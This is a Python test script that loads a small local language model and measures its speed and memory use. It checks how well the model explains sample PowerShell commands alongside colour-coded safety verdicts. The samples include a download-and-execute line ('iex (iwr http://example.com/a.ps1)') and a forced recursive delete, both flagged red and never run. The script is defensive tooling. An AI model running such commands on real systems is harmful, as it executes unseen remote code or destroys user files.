"""
Ghost model test: does a small local model fit on this PC, and are its
explanations good enough?

Usage (PowerShell, inside your venv):
    python test_llm.py D:\ghost\models\qwen2.5-1.5b-instruct-q4_k_m.gguf

It prints, for each sample command: the answer, seconds taken, and memory used.
Watch Task Manager at the same time. If peak RAM looks too high, delete the
model file and the test is over - nothing else was changed on your PC.
"""
import os
import sys
import time

import psutil
from llama_cpp import Llama

MODEL = sys.argv[1] if len(sys.argv) > 1 else r"D:\ghost\models\qwen2.5-1.5b-instruct-q4_k_m.gguf"

proc = psutil.Process(os.getpid())


def mb():
    return proc.memory_info().rss / 1024 / 1024


def peak_mb():
    # peak_wset exists on Windows; fall back to current usage elsewhere
    info = proc.memory_info()
    return getattr(info, "peak_wset", info.rss) / 1024 / 1024


SYSTEM = (
    "You are a cautious assistant that explains what a PowerShell command does. "
    "You are given the command and FACTS measured on the user's computer. "
    "Use only the facts given. Do not invent file names or numbers. "
    "Answer in 2 to 3 short plain-English sentences. "
    "Say what the command does and what it means for the files/folder."
)

# (command, facts) - the facts are what the real ghost will measure for you
SAMPLES = [
    ("Get-ChildItem", "Verdict: green (read-only). Folder has 12 files."),
    ("Remove-Item -Path .\\notes.txt", "Verdict: red (deletes). notes.txt exists, 12 KB, edited today."),
    ("Remove-Item .\\old -Recurse -Force", "Verdict: red (deletes). Folder 'old' holds 47 files and 3 subfolders, 3 edited today."),
    ("Set-Content report.txt 'hello'", "Verdict: red (overwrites). report.txt exists, 2 KB, would be replaced."),
    ("pip install requests", "Verdict: yellow (installs software). Downloads a package from the internet into Python."),
    ("iex (iwr http://example.com/a.ps1)", "Verdict: red (downloads and runs code). Runs code from the internet without showing it first."),
]

print(f"Model file : {MODEL}")
print(f"Size on disk: {os.path.getsize(MODEL) / 1024 / 1024:.0f} MB")
print(f"RAM before load: {mb():.0f} MB")

t0 = time.time()
llm = Llama(model_path=MODEL, n_ctx=1024, n_threads=max(1, (os.cpu_count() or 4) // 2), verbose=False)
print(f"Loaded in {time.time() - t0:.1f}s | RAM after load: {mb():.0f} MB\n")

for cmd, facts in SAMPLES:
    t = time.time()
    out = llm.create_chat_completion(
        messages=[
            {"role": "system", "content": SYSTEM},
            {"role": "user", "content": f"Command: {cmd}\nFACTS: {facts}\nExplain."},
        ],
        max_tokens=120,
        temperature=0.2,
    )
    text = out["choices"][0]["message"]["content"].strip()
    print("=" * 70)
    print(f"CMD   : {cmd}")
    print(f"ANSWER: {text}")
    print(f"[{time.time() - t:.1f}s | RAM now {mb():.0f} MB | peak {peak_mb():.0f} MB]")

print("\nDONE. Peak RAM during the whole test:", f"{peak_mb():.0f} MB")
